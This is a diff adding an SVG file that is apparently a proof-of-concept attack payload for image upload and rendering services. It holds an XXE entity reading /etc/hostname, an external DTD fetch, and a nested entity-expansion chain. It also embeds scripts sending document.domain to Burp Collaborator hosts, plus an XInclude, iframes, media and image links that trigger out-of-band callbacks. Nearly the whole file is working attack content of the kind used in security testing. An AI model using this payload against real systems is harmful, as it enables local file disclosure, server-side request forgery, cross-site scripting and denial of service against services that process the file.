@@ -1,0 +1,89 @@
+<?xml version="1.0" standalone="no"?>
+<!-- first we define entities-->
+<!DOCTYPE svg [
+<!ELEMENT svg (#PCDATA)>
+<!ENTITY hello "Christoffer">
+<!ENTITY d "DISCO">
+<!ENTITY l "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.">
+<!ENTITY b1 "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;">
+<!ENTITY b2 "&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;&b1;">
+<!ENTITY b3 "&b2;&b2;&b2;&b2;&b2;&b2;&b2;&b2;&b2;&b2;">
+<!ENTITY b4 "&b3;&b3;&b3;&b3;&b3;&b3;&b3;&b3;&b3;&b3;">
+<!ENTITY b5 "&b4;&b4;&b4;&b4;&b4;&b4;&b4;&b4;&b4;&b4;">
+<!ENTITY b6 "&b5;&b5;&b5;&b5;&b5;&b5;&b5;&b5;&b5;&b5;">
+<!ENTITY b7 "&b6;&b6;&b6;&b6;&b6;&b6;&b6;&b6;&b6;&b6;">
+<!ENTITY b8 "&b7;&b7;&b7;&b7;&b7;&b7;&b7;&b7;&b7;&b7;">
+<!ENTITY b9 "&b8;&b8;&b8;&b8;&b8;&b8;&b8;&b8;&b8;&b8;">
+<!ENTITY b10 "&b9;&b9;&b9;&b9;&b9;&b9;&b9;&b9;&b9;&b9;">
+<!ENTITY b11 "&b10;&b10;&b10;&b10;&b10;&b10;&b10;&b10;&b10;&b10;">
+<!ENTITY b12 "&b11;&b11;&b11;&b11;&b11;&b11;&b11;&b11;&b11;&b11;">
+<!ENTITY b13 "&b12;&b12;&b12;&b12;&b12;&b12;&b12;&b12;&b12;&b12;">
+<!ENTITY b14 "&b13;&b13;&b13;&b13;&b13;&b13;&b13;&b13;&b13;&b13;">
+<!ENTITY b15 "&b14;&b14;&b14;&b14;&b14;&b14;&b14;&b14;&b14;&b14;">
+<!ENTITY b16 "&b15;&b15;&b15;&b15;&b15;&b15;&b15;&b15;&b15;&b15;">
+<!ENTITY b17 "&b16;&b16;&b16;&b16;&b16;&b16;&b16;&b16;&b16;&b16;">
+<!ENTITY b18 "&b17;&b17;&b17;&b17;&b17;&b17;&b17;&b17;&b17;&b17;">
+<!ENTITY b19 "&b18;&b18;&b18;&b18;&b18;&b18;&b18;&b18;&b18;&b18;">
+<!ENTITY b20 "&b19;&b19;&b19;&b19;&b19;&b19;&b19;&b19;&b19;&b19;">
+<!ENTITY b21 "&b20;&b20;&b20;&b20;&b20;&b20;&b20;&b20;&b20;&b20;">
+<!ENTITY b22 "&b21;&b21;&b21;&b21;&b21;&b21;&b21;&b21;&b21;&b21;">
+<!ENTITY b23 "&b22;&b22;&b22;&b22;&b22;&b22;&b22;&b22;&b22;&b22;">
+<!ENTITY b24 "&b23;&b23;&b23;&b23;&b23;&b23;&b23;&b23;&b23;&b23;">
+<!ENTITY b25 "&b24;&b24;&b24;&b24;&b24;&b24;&b24;&b24;&b24;&b24;">
+<!ENTITY b26 "&b25;&b25;&b25;&b25;&b25;&b25;&b25;&b25;&b25;&b25;">
+<!ENTITY b27 "&b26;&b26;&b26;&b26;&b26;&b26;&b26;&b26;&b26;&b26;">
+<!ENTITY b28 "&b27;&b27;&b27;&b27;&b27;&b27;&b27;&b27;&b27;&b27;">
+<!ENTITY b29 "&b28;&b28;&b28;&b28;&b28;&b28;&b28;&b28;&b28;&b28;">
+<!ENTITY b30 "&b29;&b29;&b29;&b29;&b29;&b29;&b29;&b29;&b29;&b29;">
+<!ENTITY b31 "&b30;&b30;&b30;&b30;&b30;&b30;&b30;&b30;&b30;&b30;">
+<!ENTITY b32 "&b31;&b31;&b31;&b31;&b31;&b31;&b31;&b31;&b31;&b31;">
+<!ENTITY megaboom "&l;">
+<!ENTITY domain "+document.domain">
+<!ENTITY script '<script>alert(document.domain);var i=new Image;i.src="http://vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net/?"+document.domain;</script>'>
+
+<!ENTITY local SYSTEM "file:///etc/hostname">
+<!ENTITY pop SYSTEM "http://vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net//file.dtd">
+ ]>
+    <!-- then we define the image and add some style-->
+  <svg width="200"
+       height="200"
+       zoomAndPan="disable"
+       xmlns="http://www.w3.org/2000/svg"
+       xmlns:xlink="http://www.w3.org/1999/xlink"
+       xmlns:xi="http://www.w3.org/2001/XInclude"
+       xmlns:html="http://www.w3.org/1999/xhtml"
+       xml:space="preserve">
+
+        <style>
+           .heavy { font: bold 30px sans-serif; fill: white; }
+           .tiny { font: bold 10px serif; fill: red; }
+      </style>
+          <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+  <!-- time for some text with some entities-->
+        <text font-size="23" x="50%" y="28" dominant-baseline="middle" text-anchor="middle" class="heavy">&hello;</text>
+        <text font-size="23" x="50%" y="58" dominant-baseline="middle" text-anchor="middle">&d;</text>
+        <text font-size="23" x="50%" y="78" dominant-baseline="middle" text-anchor="middle" class="tiny">host: &local;</text>
+        <text font-size="5" x="50%" y="58" dominant-baseline="middle" text-anchor="middle">&megaboom;</text>
+        <text font-size="23" x="50%" y="88" dominant-baseline="middle" text-anchor="middle" class="tiny">X&pop;</text>
+        <text>
+        <xi:include href="http://xiincludepoc.4kpovz5deppcfa6p4o01lvlurlxdl2.dstrbnc.com" parse="text" />
+        </text>
+
+    <html:video src="http://videolinkpoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net//&d;" controls="controls"></html:video>
+    <html:audio src="http://audiolinkpoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net/&d;" controls="controls"></html:audio>
+    <html:canvas src="http://canvaslinkpoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net//&d;" controls="controls"></html:canvas>
+    <html:iframe x="29%" y="65" width="100" height="50" src="http://iframelinkpoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net/" style="width:100px;height:100px"></html:iframe>
+ 
+    <!-- lets tee if it loads a iframe -->
+      <foreignObject x="29%" y="65" width="100" height="50">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <iframe src="http://iframefopoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net/" style="width:100px;height:100px"></iframe>
+      </body>
+      </foreignObject>
+   
+    <!-- script linked from the outside-->
+    <script type="text/javascript" xlink:href="http://scriptxlinkpoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net/&d;"></script>
+ <script>var i=new Image;i.src="http://jspoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net//?"+document.domain;</script>
+    <image height="200" width="200" xlink:href="http://imagexlinkpoc.vzyahduhvc9rwfvcsvz4ryab329sxh.burpcollaborator.net/&d;" />
+  </svg>
+
